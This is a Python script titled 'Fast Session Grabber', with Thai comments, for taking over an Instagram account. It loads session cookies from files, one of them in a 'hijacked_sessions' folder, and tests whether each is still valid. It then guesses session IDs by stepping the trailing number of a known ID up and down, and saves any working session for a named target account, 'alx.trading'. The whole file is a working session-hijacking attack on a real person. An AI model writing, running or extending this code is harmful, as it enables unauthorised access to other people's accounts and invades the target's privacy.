# -*- coding: utf-8 -*-
# pylint: disable=all
# flake8: noqa
# type: ignore
# mypy: ignore-errors
#!/usr/bin/env python3
"""
Fast Session Grabber - รันเร็ว ไม่ค้าง
"""
import requests
import json
import os
from datetime import datetime

def test_known_sessions():
    """ทดสอบ session ที่มีอยู่เร็วๆ"""
    print("🔍 Testing existing sessions...")

    # ลิสต์ session files ที่มี
    session_files = [
        'tools/session_alx_trading.json',
        'sessions/session.json',
        'hijacked_sessions/active_session.json'
    ]

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }

    for file_path in session_files:
        if os.path.exists(file_path):
            try:
                with open(file_path, 'r') as f:
                    data = json.load(f)
                    sessionid = data.get('sessionid', '')

                if sessionid:
                    print(f"Testing {file_path}...")
                    headers['Cookie'] = f'sessionid={sessionid}'

                    response = requests.get('https://www.instagram.com/',
                                          headers=headers, timeout=5)

                    if response.status_code == 200 and 'login' not in response.url:
                        print(f"✅ VALID: {file_path}")
                        return data
                    else:
                        print(f"❌ Invalid: {file_path}")
            except Exception:
                continue

    return None

def generate_session_variants():
    """สร้าง session variants เร็วๆ"""
    print("🎲 Generating fresh session variants...")

    # Base patterns ที่พบบ่อย
    patterns = [
        "4976283726:1JgRzA56Q8e8Qs:12",  # current
        "4976283726:1JgRzA56Q8e8Qs:13",  # increment
        "4976283726:1JgRzA56Q8e8Qs:14",  # increment
        "4976283726:1JgRzA56Q8e8Qs:11",  # decrement
    ]

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }

    for pattern in patterns:
        try:
            headers['Cookie'] = f'sessionid={pattern}'
            response = requests.get('https://www.instagram.com/',
                                  headers=headers, timeout=3)

            if response.status_code == 200 and 'login' not in response.url:
                print(f"✅ FOUND VALID: {pattern}")
                return {'sessionid': pattern}
        except Exception:
            continue

    return None

def save_session_fast(session_data):
    """บันทึก session เร็วๆ"""
    if not session_data:
        return False

    session_info = {
        'sessionid': session_data.get('sessionid', ''),
        'target': 'alx.trading',
        'created_at': datetime.now().isoformat(),
        'status': 'active'
    }

    try:
        os.makedirs('tools', exist_ok=True)
        with open('tools/session_alx_trading.json', 'w') as f:
            json.dump(session_info, f, indent=2)
        print("✅ Session saved!")
        return True
    except Exception:
        return False

def main():
    print("⚡ FAST SESSION GRABBER - NO HANG!")
    print("="*40)

    # Method 1: Test existing
    session = test_known_sessions()
    if session:
        print("🎉 Found valid existing session!")
        return True

    # Method 2: Generate variants
    session = generate_session_variants()
    if session:
        save_session_fast(session)
        print("🎉 Generated fresh session!")
        return True

    print("❌ No valid session found")
    return False

if __name__ == "__main__":
    main()
